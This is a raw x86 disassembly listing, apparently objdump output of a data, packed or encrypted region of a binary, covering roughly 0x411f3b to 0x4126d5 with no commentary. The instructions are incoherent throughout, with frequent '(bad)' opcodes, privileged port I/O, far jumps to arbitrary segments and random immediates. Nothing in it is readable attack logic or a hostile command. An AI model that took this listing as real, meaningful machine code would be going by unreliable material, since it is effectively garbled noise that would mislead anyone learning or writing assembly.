  411f3b:	fisub  WORD PTR [eax+edx*2-0x77307a8f]
  411f42:	pop    ss
  411f43:	ds aaa 
  411f45:	inc    edi
  411f46:	(bad)
  411f49:	cmp    esp,DWORD PTR [eax-0x26]
  411f4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f4d:	int3   
  411f4e:	fldpi  
  411f50:	sti    
  411f51:	and    bh,dh
  411f53:	ins    DWORD PTR es:[edi],dx
  411f54:	jne    0x411f07
  411f56:	aaa    
  411f57:	xor    dl,BYTE PTR [edi+0x49571d35]
  411f5d:	jbe    0x411f9d
  411f5f:	sub    al,0x79
  411f61:	call   0xfb9079dc
  411f66:	xchg   edx,eax
  411f67:	daa    
  411f68:	out    dx,eax
  411f69:	push   edi
  411f6a:	push   0x50
  411f6c:	sub    eax,0xa5ff230a
  411f71:	dec    ecx
  411f72:	enter  0x1df8,0x74
  411f76:	jno    0x411f71
  411f78:	push   0x40
  411f7a:	jmp    DWORD PTR [edi+0x40]
  411f7d:	shl    edx,0x37
  411f80:	cdq    
  411f81:	sub    DWORD PTR [edi],edx
  411f83:	fisttp DWORD PTR [ebx+ebp*1]
  411f86:	xchg   ecx,eax
  411f87:	fcomp  st(2)
  411f89:	pop    ss
  411f8a:	rcr    DWORD PTR [ebx-0x20],cl
  411f8d:	rcl    BYTE PTR [esi-0x57959fce],1
  411f93:	cmp    ecx,ecx
  411f95:	std    
  411f96:	stc    
  411f97:	sbb    bh,dh
  411f99:	xor    eax,0x313f26f3
  411f9e:	jg     0x411f25
  411fa0:	pushf  
  411fa1:	loop   0x411fc4
  411fa3:	jno    0x411fda
  411fa5:	xchg   esp,eax
  411fa6:	fcmove st,st(4)
  411fa8:	jo     0x411f97
  411faa:	iret   
  411fab:	inc    ebp
  411fac:	mov    WORD PTR [ebx-0x2a],gs
  411faf:	cmp    DWORD PTR [eax],eax
  411fb1:	pop    esi
  411fb2:	cmp    al,0x2
  411fb4:	jp     0x411fe9
  411fb6:	mov    esp,0xcdcfd5ae
  411fbb:	cld    
  411fbc:	jle    0x411f40
  411fbe:	(bad)  
  411fbf:	(bad)  [eax-0x4d]
  411fc2:	mov    dh,BYTE PTR [esi+0x6f163431]
  411fc8:	fnsave [ebp-0x4f]
  411fcb:	std    
  411fcc:	cli    
  411fcd:	retf   
  411fce:	push   ebp
  411fcf:	and    DWORD PTR [esi],edi
  411fd1:	mov    bl,0x9e
  411fd3:	add    eax,0x10c29fc3
  411fd8:	repnz rol DWORD PTR [ebx],1
  411fdb:	stos   BYTE PTR es:[edi],al
  411fdc:	jbe    0x411fa7
  411fde:	inc    ebx
  411fdf:	sbb    DWORD PTR [ebp+edi*8-0x3148c0a3],esp
  411fe6:	fsub   DWORD PTR [edi-0x50]
  411fe9:	and    al,0xca
  411feb:	and    esp,0x46d17364
  411ff1:	jno    0x412046
  411ff3:	fwait
  411ff4:	mov    BYTE PTR [ebx+esi*2],0xbe
  411ff8:	dec    edi
  411ff9:	outs   dx,DWORD PTR ds:[esi]
  411ffa:	out    dx,eax
  411ffb:	sti    
  411ffc:	in     eax,0xf3
  411ffe:	cmp    ch,BYTE PTR [ebp-0x2a33d320]
  412004:	inc    ecx
  412005:	xchg   ebp,eax
  412006:	sahf   
  412007:	imul   esi,DWORD PTR [eax+ebp*4+0x79],0xffffffa9
  41200c:	xchg   BYTE PTR [edi],bl
  41200e:	jmp    0xb99bf140
  412013:	test   eax,0xf90288fa
  412018:	ret    
  412019:	mov    dl,0xe
  41201b:	mov    dl,0x1d
  41201d:	sbb    BYTE PTR [ebx+esi*1-0x54f9847d],dh
  412024:	xlat   BYTE PTR ds:[ebx]
  412025:	arpl   WORD PTR [edi-0x74],sp
  412028:	add    DWORD PTR [esi-0x54fefa4c],0x718ff136
  412032:	jnp    0x411ff9
  412034:	hlt    
  412035:	bound  ecx,QWORD PTR [eax+0x730a62e9]
  41203b:	xor    eax,0x4eb2ed14
  412040:	pop    eax
  412041:	daa    
  412042:	(bad)  
  412043:	cmp    al,0x30
  412045:	ds pop edx
  412047:	jecxz  0x41202b
  412049:	sbb    bl,BYTE PTR [eax+0x12]
  41204c:	mov    dl,0x5c
  41204e:	in     al,0x4a
  412050:	pop    ds
  412051:	mov    ebp,0xefb0b50b
  412056:	mov    ah,BYTE PTR [esi]
  412058:	cli    
  412059:	addr16 jp 0x412082
  41205c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41205d:	loop   0x41204e
  41205f:	sbb    ch,BYTE PTR [ebx-0x59586e0c]
  412065:	(bad)  
  412066:	xchg   esp,eax
  412067:	inc    esi
  412068:	mov    ecx,0x3d446fea
  41206d:	rol    DWORD PTR [ecx],1
  41206f:	mov    edx,0xd922ac66
  412074:	sbb    BYTE PTR [ebp+eiz*4+0x5f],0x2d
  412079:	test   eax,0x79ad99e6
  41207e:	mov    bl,BYTE PTR [edi+0x63]
  412081:	shl    DWORD PTR [ecx],cl
  412083:	mov    esi,0xcfc450a1
  412088:	test   DWORD PTR [eax+0x1f],eax
  41208b:	js     0x41207e
  41208d:	cmp    eax,0xda762e0e
  412092:	jns    0x4120d0
  412094:	daa    
  412095:	(bad)  
  412096:	popf   
  412097:	int3   
  412098:	repz int3 
  41209a:	scas   eax,DWORD PTR es:[edi]
  41209b:	std    
  41209c:	fsub   QWORD PTR [edx-0x48]
  41209f:	pop    ebp
  4120a0:	push   eax
  4120a1:	stos   BYTE PTR es:[edi],al
  4120a2:	jecxz  0x412113
  4120a4:	fdiv   QWORD PTR [esi+0x2a]
  4120a7:	xchg   esi,eax
  4120a8:	inc    edx
  4120a9:	nop
  4120aa:	and    ebp,edx
  4120ac:	jmp    0xa35528b1
  4120b1:	push   edx
  4120b2:	xor    eax,0xbab39bc
  4120b7:	mov    ecx,0xb6454675
  4120bc:	and    eax,0x2d87712d
  4120c1:	xlat   BYTE PTR ds:[ebx]
  4120c2:	ret    
  4120c3:	jp     0x412089
  4120c5:	out    0x4c,eax
  4120c7:	ret    
  4120c8:	sahf   
  4120c9:	nop
  4120ca:	xchg   esp,eax
  4120cb:	lahf   
  4120cc:	dec    edx
  4120cd:	dec    eax
  4120ce:	dec    ebx
  4120cf:	and    DWORD PTR [ecx-0x504ae5e2],ebp
  4120d5:	xchg   edi,eax
  4120d6:	jecxz  0x4120d7
  4120d8:	cld    
  4120d9:	cmp    ah,ch
  4120db:	sbb    edi,DWORD PTR [ebx-0x412e4ed5]
  4120e1:	sti    
  4120e2:	inc    edx
  4120e3:	or     esp,esi
  4120e5:	or     ebp,esi
  4120e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120e8:	or     al,0x7d
  4120ea:	push   edi
  4120eb:	add    al,0xe3
  4120ed:	arpl   WORD PTR [ecx-0x47fbf575],dx
  4120f3:	out    0xa4,al
  4120f5:	sbb    ecx,esi
  4120f7:	cmp    BYTE PTR [ebp+ebp*2-0x20d1ca66],cl
  4120fe:	lahf   
  4120ff:	push   esi
  412100:	pop    ds
  412101:	push   es
  412102:	or     BYTE PTR [eax+ebp*8-0xc],0x5
  412107:	dec    esp
  412108:	idiv   DWORD PTR [esi]
  41210a:	push   0x3e83faaf
  41210f:	pop    ebx
  412110:	lods   al,BYTE PTR ds:[esi]
  412111:	mov    ecx,0x40ccbffe
  412116:	and    DWORD PTR [ecx],eax
  412118:	and    esi,DWORD PTR [ebx]
  41211a:	call   0xa4b57c57
  41211f:	pop    es
  412120:	or     al,0xdc
  412122:	rol    DWORD PTR [edi-0x50],0x7b
  412126:	cmp    BYTE PTR [esi],0x9f
  412129:	mov    cl,0xca
  41212b:	inc    edx
  41212c:	(bad)  
  41212d:	mov    eax,0x1806a5e
  412132:	pushf  
  412133:	(bad)  
  412134:	cmp    DWORD PTR [eax-0x59072146],edx
  41213a:	push   ss
  41213b:	and    DWORD PTR [eax+esi*8+0x71b43309],eax
  412142:	lea    esp,[esi-0x1a8ef713]
  412148:	jge    0x4121bb
  41214a:	xchg   ebx,eax
  41214b:	fwait
  41214c:	sbb    DWORD PTR [ecx-0x68],0xffffffae
  412150:	mov    ecx,0xd5fd9706
  412155:	mov    DWORD PTR [esi],esi
  412157:	add    cl,dh
  412159:	and    al,0xcc
  41215b:	sahf   
  41215c:	sbb    eax,0x2715da7a
  412161:	cmp    dh,bh
  412163:	sub    ch,BYTE PTR [ecx+0x1b93aced]
  412169:	jecxz  0x412144
  41216b:	(bad)  
  41216c:	or     ecx,ebx
  41216e:	sub    dl,BYTE PTR ss:[esi]
  412171:	xor    al,0xb2
  412173:	push   edi
  412174:	cmp    eax,0x768597e5
  412179:	in     eax,dx
  41217a:	mov    DWORD PTR [ebx+edi*1-0x7c],edi
  41217e:	lock in al,0x62
  412181:	push   cs
  412182:	loop   0x41216a
  412184:	jae    0x412171
  412186:	dec    si
  412188:	dec    ebp
  412189:	sub    eax,0xcb16d12d
  41218e:	or     dl,BYTE PTR [ebx]
  412190:	cmp    al,0x9e
  412192:	adc    ecx,DWORD PTR [ebx+0x7d]
  412195:	inc    edx
  412196:	in     al,dx
  412197:	repz cdq 
  412199:	out    0xd4,eax
  41219b:	mov    ah,0xd2
  41219d:	(bad)  
  41219e:	push   ebx
  41219f:	rol    DWORD PTR [eax+0x49],0x79
  4121a3:	mov    bh,0x87
  4121a5:	fidivr DWORD PTR [eax+0x60]
  4121a8:	lea    esp,[ecx+0x62d84c9a]
  4121ae:	int3   
  4121af:	jmp    0x41221d
  4121b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121b2:	or     BYTE PTR [edx-0x46ceabbe],dl
  4121b8:	jbe    0x4121f9
  4121ba:	dec    edi
  4121bb:	cld    
  4121bc:	xchg   ebx,eax
  4121bd:	inc    ebp
  4121be:	push   ebx
  4121bf:	gs repnz int3 
  4121c2:	jno    0x41218d
  4121c4:	pop    ecx
  4121c5:	push   ds
  4121c6:	or     eax,ebx
  4121c8:	pop    es
  4121c9:	scas   eax,DWORD PTR es:[edi]
  4121ca:	push   esi
  4121cb:	dec    edx
  4121cc:	mov    al,0x4e
  4121ce:	push   ss
  4121cf:	pop    es
  4121d0:	sub    eax,DWORD PTR [ecx-0x25cda3e]
  4121d6:	dec    esp
  4121d7:	jb     0x4121e7
  4121d9:	cmp    ah,dh
  4121db:	jne    0x4121e9
  4121dd:	pop    ecx
  4121de:	and    al,0xe9
  4121e0:	xchg   ebx,eax
  4121e1:	hlt    
  4121e2:	cmp    eax,edx
  4121e4:	sbb    ebp,ecx
  4121e6:	and    edi,ecx
  4121e8:	xchg   BYTE PTR [ebp-0x75e37c67],cl
  4121ee:	and    DWORD PTR [edx-0x5dbca115],edx
  4121f4:	mov    ebx,0x6977c277
  4121f9:	adc    bl,ah
  4121fb:	scas   al,BYTE PTR es:[edi]
  4121fc:	inc    ebp
  4121fd:	js     0x412277
  4121ff:	sub    eax,0xe1b307b4
  412204:	sbb    bl,dl
  412206:	frstor [ebx+edx*8-0x76]
  41220a:	inc    edx
  41220b:	dec    eax
  41220c:	das    
  41220d:	mov    ah,0x34
  41220f:	push   ds
  412210:	jmp    0x6d3b:0xaa9b10a5
  412217:	cli    
  412218:	lods   al,BYTE PTR ds:[esi]
  412219:	cmp    bh,BYTE PTR [edi+0x7d07dbc4]
  41221f:	mov    ds:0x92b922cf,al
  412224:	cld    
  412225:	push   edi
  412226:	adc    al,0xf7
  412228:	jmp    0x6e4a:0x30f7d859
  41222f:	lds    ebx,FWORD PTR [ecx]
  412231:	sbb    DWORD PTR [edx+ecx*8-0x3f],esp
  412235:	ins    BYTE PTR es:[edi],dx
  412236:	push   esp
  412237:	mov    BYTE PTR [eax+0x3e],ch
  41223a:	sar    DWORD PTR [eax],cl
  41223c:	and    al,0x91
  41223e:	xlat   BYTE PTR ds:[ebx]
  41223f:	repz in eax,0xdd
  412242:	call   0xf92619d7
  412247:	mov    bl,0xd
  412249:	pop    ss
  41224a:	lods   eax,DWORD PTR ds:[esi]
  41224b:	mov    ebx,0x7df60b03
  412250:	jp     0x4121fd
  412252:	in     al,dx
  412253:	or     DWORD PTR [edx],esi
  412255:	lock mov BYTE PTR [eax+eax*4],cl
  412259:	fs pop ebp
  41225b:	imul   eax,DWORD PTR [ebp+0x5f],0x9
  41225f:	sub    ebp,0x50
  412262:	jo     0x4121f1
  412264:	push   ds
  412265:	enter  0x337d,0x6c
  412269:	test   al,0x70
  41226b:	xor    ebp,esi
  41226d:	adc    BYTE PTR [ecx],dh
  41226f:	mov    cl,0x86
  412271:	pop    ebx
  412272:	dec    ecx
  412273:	jbe    0x41224f
  412275:	jp     0x412238
  412277:	lods   eax,DWORD PTR ds:[esi]
  412278:	je     0x4122ee
  41227a:	jbe    0x412287
  41227c:	fwait
  41227d:	test   DWORD PTR [eax],eax
  41227f:	push   ss
  412280:	inc    eax
  412281:	xchg   edi,eax
  412282:	test   eax,0x1ea12d3f
  412287:	imul   DWORD PTR ds:0xa3826985
  41228e:	icebp  
  41228f:	mov    ah,0xc4
  412291:	das    
  412292:	dec    esi
  412293:	or     esi,0x6d335ce7
  412299:	jne    0x41225d
  41229b:	mov    al,0x12
  41229d:	inc    edx
  41229e:	in     eax,0xb5
  4122a0:	lahf   
  4122a1:	jge    0x4122d5
  4122a3:	stos   DWORD PTR es:[edi],eax
  4122a4:	icebp  
  4122a5:	add    DWORD PTR [edi],eax
  4122a7:	sti    
  4122a8:	out    0xbc,al
  4122aa:	ror    BYTE PTR [eax],0xc7
  4122ad:	xchg   DWORD PTR [ecx+ebx*8],eax
  4122b0:	inc    esi
  4122b1:	sar    DWORD PTR [edi-0x8],cl
  4122b4:	(bad)  
  4122b5:	fmul   DWORD PTR es:[eax+0x2e]
  4122b9:	cmp    eax,0xb7d7ec9b
  4122be:	mov    BYTE PTR fs:[eax-0x2d],dl
  4122c2:	sahf   
  4122c3:	pusha  
  4122c4:	adc    DWORD PTR ds:0xf9d21610,eax
  4122ca:	mov    ebp,DWORD PTR [edx+0x77]
  4122cd:	pushf  
  4122ce:	lock xchg bl,dh
  4122d1:	(bad)  
  4122d2:	pop    ss
  4122d3:	pusha  
  4122d4:	mov    ebp,ecx
  4122d6:	imul   ecx,DWORD PTR [edx+0x3d3ff591],0xe7e8d798
  4122e0:	int3   
  4122e1:	(bad)  
  4122e4:	rcr    BYTE PTR es:[eax],1
  4122e7:	inc    edi
  4122e8:	das    
  4122e9:	test   al,0xdb
  4122eb:	mov    ah,0x80
  4122ed:	or     edx,edi
  4122ef:	dec    ebx
  4122f0:	shl    DWORD PTR [ecx+ecx*1+0x3cd83b5c],1
  4122f7:	inc    eax
  4122f8:	jg     0x41232e
  4122fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122fb:	ror    BYTE PTR [eax],1
  4122fd:	outs   dx,BYTE PTR ds:[esi]
  4122fe:	xor    ebx,DWORD PTR [ebx-0x3aff3f76]
  412304:	int3   
  412305:	stos   BYTE PTR es:[edi],al
  412306:	xor    eax,0x56fe1521
  41230b:	ss ja  0x412314
  41230e:	and    eax,0xa7f21b46
  412313:	call   0x7be7:0x57097f10
  41231a:	ror    BYTE PTR [eax],1
  41231c:	inc    edx
  41231d:	frstor [ebx]
  41231f:	xor    al,0x6a
  412321:	mov    al,0xf1
  412323:	xor    eax,DWORD PTR [ecx]
  412325:	inc    DWORD PTR [ebx+0x587a428b]
  41232b:	ds pop esp
  41232d:	dec    esp
  41232e:	cmp    BYTE PTR [edx+0x5b],ah
  412331:	mov    eax,ds:0x71038ed3
  412336:	sbb    esi,ecx
  412338:	adc    DWORD PTR [edi],ecx
  41233a:	adc    eax,0x8bf5622c
  41233f:	test   eax,0xf44420d4
  412344:	bound  ecx,QWORD PTR [edx+0x158d3229]
  41234a:	loope  0x4122d3
  41234c:	mov    bh,0x8
  41234e:	lods   al,BYTE PTR ds:[esi]
  41234f:	add    dh,BYTE PTR [ebx+0x77d4fee0]
  412355:	rol    ebx,cl
  412357:	in     eax,dx
  412358:	call   0x4c4e:0xecfeba5a
  41235f:	ins    BYTE PTR es:[edi],dx
  412360:	jmp    0xdae8d22e
  412365:	jns    0x4122ff
  412367:	mov    bl,dh
  412369:	pusha  
  41236a:	xlat   BYTE PTR ds:[ebx]
  41236b:	push   es
  41236c:	test   al,0x2f
  41236e:	adc    eax,DWORD PTR [edx]
  412370:	scas   al,BYTE PTR es:[edi]
  412371:	dec    esp
  412372:	pop    es
  412373:	stos   BYTE PTR es:[edi],al
  412374:	dec    eax
  412375:	fst    st(6)
  412377:	add    esi,ebx
  412379:	xchg   edx,eax
  41237a:	add    DWORD PTR [ecx-0x6a],esi
  41237d:	in     al,0x53
  41237f:	repnz aad 0xac
  412382:	in     eax,dx
  412383:	jp     0x41231a
  412385:	and    BYTE PTR [ebp-0x58],dh
  412388:	sbb    edx,edx
  41238a:	mov    bh,0x6f
  41238c:	cdq    
  41238d:	out    0x4e,eax
  41238f:	es in  al,dx
  412391:	mov    dl,0xc2
  412393:	dec    ebp
  412394:	daa    
  412395:	jo     0x4123bd
  412397:	lods   al,BYTE PTR ds:[esi]
  412398:	dec    ebp
  412399:	lods   al,BYTE PTR ds:[esi]
  41239a:	dec    ebx
  41239b:	mov    dh,0x9c
  41239d:	mov    bl,0x42
  41239f:	xchg   ebx,eax
  4123a0:	adc    edx,0x9aec60a4
  4123a6:	cld    
  4123a7:	xor    bl,dh
  4123a9:	dec    ebx
  4123aa:	pushf  
  4123ab:	cmp    dh,BYTE PTR [eax-0x615f2c10]
  4123b1:	jl     0x41238a
  4123b3:	cmp    ebp,ebx
  4123b5:	ret    
  4123b6:	fisttp QWORD PTR ds:0x8e1dcb0
  4123bc:	int3   
  4123bd:	mov    ebx,0xb27162df
  4123c2:	popa   
  4123c3:	dec    edi
  4123c4:	adc    dl,BYTE PTR [ebx+0x6a6199f3]
  4123ca:	jo     0x4123ee
  4123cc:	sar    BYTE PTR [ebx+0x9],0xda
  4123d0:	sbb    esi,0x2a
  4123d3:	mov    bl,0x4e
  4123d5:	test   DWORD PTR [edx],esp
  4123d7:	jp     0x412409
  4123d9:	or     DWORD PTR [esi+ebp*1-0x6f],edx
  4123dd:	test   esp,eax
  4123df:	xchg   esi,eax
  4123e0:	jnp    0x4123fe
  4123e2:	mov    bh,0xf9
  4123e4:	call   0xcd7a:0x99742aaa
  4123eb:	clc    
  4123ec:	and    al,0xb8
  4123ee:	in     al,0x98
  4123f0:	add    edi,DWORD PTR [edi]
  4123f2:	xchg   esi,eax
  4123f3:	mov    cl,0x71
  4123f5:	inc    ebx
  4123f6:	xchg   esi,eax
  4123f7:	inc    edi
  4123f8:	(bad)  
  4123f9:	sub    al,0xc2
  4123fb:	jecxz  0x4123c2
  4123fd:	popf   
  4123fe:	leave  
  4123ff:	mov    ebp,0xcabe199a
  412404:	push   esi
  412405:	sbb    esi,eax
  412407:	mov    ds:0x9e8115dd,al
  41240c:	fisub  WORD PTR [ecx+0x6e]
  41240f:	stos   BYTE PTR es:[edi],al
  412410:	jmp    0x49ee:0x9e45fa7
  412417:	and    al,ch
  412419:	imul   ebp,eax,0xa70996b2
  41241f:	and    al,0x3e
  412421:	mov    bl,0xad
  412423:	ins    BYTE PTR es:[edi],dx
  412424:	scas   eax,DWORD PTR es:[edi]
  412425:	daa    
  412426:	lock adc esp,edx
  412429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41242a:	das    
  41242b:	imul   edi,DWORD PTR [ebx+0x6d],0xffffffdf
  41242f:	jmp    0x412460
  412431:	aam    0x79
  412433:	ret    
  412434:	sub    eax,0x3035e13a
  412439:	xchg   ebp,eax
  41243a:	mov    bl,0x9d
  41243c:	xor    DWORD PTR [esi+0xb],edx
  41243f:	xchg   edx,ebx
  412441:	pusha  
  412442:	ins    DWORD PTR es:[edi],dx
  412443:	pop    edi
  412444:	and    al,0x7d
  412446:	lock sbb eax,edi
  412449:	push   edx
  41244a:	pop    esp
  41244b:	jb     0x412442
  41244d:	sub    DWORD PTR [ebx],eax
  41244f:	mov    al,0x82
  412451:	iret   
  412452:	sub    eax,0xb734f35a
  412457:	jg     0x412495
  412459:	outs   dx,BYTE PTR ds:[esi]
  41245a:	xlat   BYTE PTR ds:[ebx]
  41245b:	fistp  WORD PTR ds:0x3ec3703f
  412461:	imul   eax,DWORD PTR [ecx+0x6b],0x28
  412465:	out    dx,al
  412466:	outs   dx,DWORD PTR ds:[esi]
  412467:	cmp    bl,ch
  412469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41246a:	ins    DWORD PTR es:[edi],dx
  41246b:	nop
  41246c:	sbb    eax,0x6d72d83b
  412471:	pop    ss
  412472:	xor    ebx,ebp
  412474:	push   ebx
  412475:	je     0x4123fe
  412477:	add    eax,0xf0e95c9d
  41247c:	and    al,BYTE PTR [eax+0x7be60650]
  412482:	frstor [eax+0x4a]
  412485:	or     al,ah
  412487:	dec    edi
  412488:	sti    
  412489:	dec    ecx
  41248a:	stos   BYTE PTR es:[edi],al
  41248b:	shr    DWORD PTR gs:[ebp+0x1317da7],1
  412492:	ret    0x4c9a
  412495:	sub    al,0xb7
  412497:	cmp    BYTE PTR [ecx+0x5392c2f3],dl
  41249d:	in     al,dx
  41249e:	xor    al,0xb4
  4124a0:	pop    edi
  4124a1:	popf   
  4124a2:	mov    esi,0xf81fe116
  4124a7:	or     al,0xa3
  4124a9:	mov    ss,WORD PTR [esi-0x66]
  4124ac:	cmp    BYTE PTR [eax],al
  4124ae:	mov    ds:0xf1e91e4,eax
  4124b3:	lock xor ebp,DWORD PTR [ebx+ebp*4-0x4a]
  4124b8:	pusha  
  4124b9:	call   0xc992:0x143acd18
  4124c0:	ficom  DWORD PTR [edx-0x15]
  4124c3:	jle    0x412460
  4124c5:	loopne 0x4124a3
  4124c7:	popf   
  4124c8:	and    BYTE PTR cs:[edx],ah
  4124cb:	cmp    BYTE PTR ds:0x9e6c27a9,0xd1
  4124d2:	aas    
  4124d3:	cwde   
  4124d4:	xor    DWORD PTR [ebp+0x57],ebp
  4124d7:	out    0x1c,eax
  4124d9:	jo     0x4124ee
  4124db:	fwait
  4124dc:	mov    edi,0xb80a8cab
  4124e1:	scas   eax,DWORD PTR es:[edi]
  4124e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124e3:	sub    ch,bl
  4124e5:	clc    
  4124e6:	lea    edi,[esi+0x2b]
  4124e9:	enter  0xf152,0x1
  4124ed:	daa    
  4124ee:	inc    ebx
  4124ef:	or     al,0x8d
  4124f1:	xchg   BYTE PTR [ecx-0x63db08f1],dh
  4124f7:	and    ch,BYTE PTR [esi]
  4124f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124fa:	mov    bl,0x5f
  4124fc:	fs inc ecx
  4124fe:	pop    esi
  4124ff:	inc    ebx
  412500:	in     al,dx
  412501:	stos   BYTE PTR es:[edi],al
  412502:	in     al,dx
  412503:	out    dx,eax
  412504:	push   ebp
  412505:	sbb    DWORD PTR [eax],edi
  412507:	push   edx
  412508:	jp     0x412576
  41250a:	push   ebp
  41250b:	ficom  WORD PTR [eax]
  41250d:	mov    eax,ds:0xa9ddb822
  412512:	pop    edx
  412513:	leave  
  412514:	xchg   ebx,eax
  412515:	or     bl,BYTE PTR [ecx]
  412517:	(bad)  
  412518:	xor    eax,0xbf7d86e2
  41251d:	int3   
  41251e:	lea    eax,[ebp+ebp*2-0x2572aa9f]
  412525:	or     al,0x64
  412527:	popw   ss
  412529:	scas   eax,DWORD PTR es:[edi]
  41252a:	inc    eax
  41252b:	retf   0xd430
  41252e:	cmp    ah,ch
  412530:	stos   BYTE PTR es:[edi],al
  412531:	inc    edi
  412532:	dec    esp
  412533:	push   ds
  412534:	add    BYTE PTR [esp+edx*1+0x5f777516],dh
  41253b:	cdq    
  41253c:	ret    
  41253d:	mov    esi,0x91431dd2
  412542:	or     esp,ebp
  412544:	add    eax,0x6f75684b
  412549:	mov    al,0x71
  41254b:	push   ebp
  41254c:	push   ds
  41254d:	mov    DWORD PTR [eax+eax*1-0x7f],edx
  412551:	mov    al,0xf
  412553:	push   ebx
  412554:	sub    eax,0x8ad9a4c5
  412559:	pushf  
  41255a:	mov    esi,0xfb4cb469
  41255f:	sub    DWORD PTR [esi+ecx*8+0x4b6e29fd],edi
  412566:	lock outs dx,DWORD PTR ds:[esi]
  412568:	aam    0xbd
  41256a:	ds in  eax,0x40
  41256d:	sbb    eax,0x88f66d71
  412572:	sahf   
  412573:	pop    ecx
  412574:	(bad)  
  412575:	repz call 0xd3b2:0x8664be98
  41257d:	aaa    
  41257e:	push   esp
  41257f:	mov    ch,0x15
  412581:	mov    ebx,0x528c9b1
  412586:	test   bh,0xe4
  412589:	adc    ecx,DWORD PTR [edi]
  41258b:	in     al,0x55
  41258d:	fcmovnb st,st(7)
  41258f:	sbb    al,0x7b
  412591:	jecxz  0x41258e
  412593:	test   al,0xb7
  412595:	popa   
  412596:	mov    esi,0x3ddfc722
  41259b:	cdq    
  41259c:	xchg   ebp,eax
  41259d:	sti    
  41259e:	js     0x41261c
  4125a0:	stos   BYTE PTR es:[edi],al
  4125a1:	adc    eax,0xe60a18da
  4125a6:	lds    edi,FWORD PTR [eax-0x66355f38]
  4125ac:	xchg   edi,eax
  4125ad:	shl    BYTE PTR [ecx+0x3608f0b0],0xd3
  4125b4:	mov    dl,0x41
  4125b6:	(bad)  
  4125b7:	ins    DWORD PTR es:[edi],dx
  4125b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125b9:	mov    ds:0x6aeaaba1,eax
  4125be:	test   DWORD PTR [ebx-0x254596d0],ebp
  4125c4:	mov    esp,0x42cb5100
  4125c9:	pushf  
  4125ca:	and    DWORD PTR [eax],esi
  4125cc:	cmp    eax,0x420a23ab
  4125d1:	sqrtss xmm7,DWORD PTR [ebp-0x4]
  4125d6:	mov    al,0xc
  4125d8:	xor    ecx,DWORD PTR [ecx]
  4125da:	mov    dl,0x3c
  4125dc:	cmp    al,0x6d
  4125de:	jae    0x412572
  4125e0:	or     cl,bh
  4125e2:	inc    esi
  4125e3:	es inc eax
  4125e5:	add    BYTE PTR [ecx+0x25],bl
  4125e8:	push   ds
  4125e9:	add    BYTE PTR [ecx-0x334796d7],0x54
  4125f0:	(bad)  
  4125f1:	jmp    0x41262e
  4125f3:	cs sti 
  4125f5:	xchg   ebp,eax
  4125f6:	jmp    0x412578
  4125f8:	and    al,0x67
  4125fa:	stos   DWORD PTR es:[edi],eax
  4125fb:	sub    ecx,DWORD PTR [ecx]
  4125fd:	mov    bl,0xa4
  4125ff:	mov    al,0x59
  412601:	daa    
  412602:	xor    esp,esp
  412604:	ret    0x3aa2
  412607:	jg     0x41261b
  412609:	sbb    BYTE PTR [edx+0x7c],ch
  41260c:	lea    edx,[ebx-0x30298fd3]
  412612:	dec    ebp
  412613:	cld    
  412614:	cwde   
  412615:	aaa    
  412616:	inc    ebx
  412617:	leave  
  412618:	scas   al,BYTE PTR es:[edi]
  412619:	jmp    0x412638
  41261b:	or     ebp,DWORD PTR [ebx]
  41261d:	and    al,0x9d
  41261f:	and    eax,0xbcbcf4c0
  412624:	enter  0x6022,0x90
  412628:	and    esi,DWORD PTR [esi-0x7c]
  41262b:	push   0xb830bca6
  412630:	int3   
  412631:	dec    eax
  412632:	std    
  412633:	jle    0x4125ec
  412635:	jb     0x412654
  412637:	fisubr DWORD PTR [ebx+0x2fb86b0a]
  41263d:	aaa    
  41263e:	adc    BYTE PTR [esi],ah
  412640:	stos   BYTE PTR es:[edi],al
  412641:	mov    cl,0xbc
  412643:	xchg   ebx,eax
  412644:	mov    ds:0x64e35645,eax
  412649:	fsubr  st,st(1)
  41264b:	mov    ?,edi
  41264d:	out    0x20,al
  41264f:	mov    eax,ds:0xea2f716
  412654:	pop    edi
  412655:	pusha  
  412656:	xchg   ecx,eax
  412657:	call   0x48c3b57c
  41265c:	call   0x698e:0xe6abe211
  412663:	shr    BYTE PTR [eax-0x418d1cd7],cl
  412669:	jle    0x41268d
  41266b:	jl     0x4126bf
  41266d:	push   ebx
  41266e:	test   al,0xdd
  412670:	push   ss
  412671:	int    0x51
  412673:	pushf  
  412674:	pop    ebp
  412675:	mov    ah,0xb5
  412677:	pop    esp
  412678:	test   DWORD PTR [esi-0x3c],ebp
  41267b:	(bad)  
  41267c:	into   
  41267d:	out    dx,eax
  41267e:	mov    al,ds:0x93375e1e
  412683:	int3   
  412684:	out    dx,al
  412685:	adc    al,0xb1
  412687:	adc    DWORD PTR [ebp+esi*1-0xf],ebx
  41268b:	push   ss
  41268c:	jg     0x41266b
  41268e:	mov    bh,0xaa
  412690:	inc    ecx
  412691:	jmp    0x7766:0x38381129
  412698:	out    dx,al
  412699:	inc    ebp
  41269a:	or     al,0xc4
  41269c:	cld    
  41269d:	adc    al,0xbb
  41269f:	jmp    0xc283:0x5161bc20
  4126a6:	(bad)  
  4126a7:	sti    
  4126a8:	dec    eax
  4126a9:	push   ds
  4126aa:	xlat   BYTE PTR ds:[ebx]
  4126ab:	inc    ecx
  4126ac:	mov    al,ds:0x85b5ef6
  4126b1:	mov    ds:0x889f1d3d,al
  4126b6:	mov    DWORD PTR [ebx-0x27],esi
  4126b9:	push   esp
  4126ba:	xor    eax,0x17b4707c
  4126bf:	mov    gs,ebp
  4126c1:	stos   DWORD PTR es:[edi],eax
  4126c2:	pop    edx
  4126c3:	mov    ch,BYTE PTR [edx+0x5]
  4126c6:	mov    dh,0xd4
  4126c8:	jle    0x4126b8
  4126ca:	in     eax,0x80
  4126cc:	(bad)  
  4126cd:	scas   al,BYTE PTR es:[edi]
  4126ce:	dec    edx
  4126cf:	hlt    
  4126d0:	mov    esp,0xe5122429
  4126d5:	jmp    0x4126ff
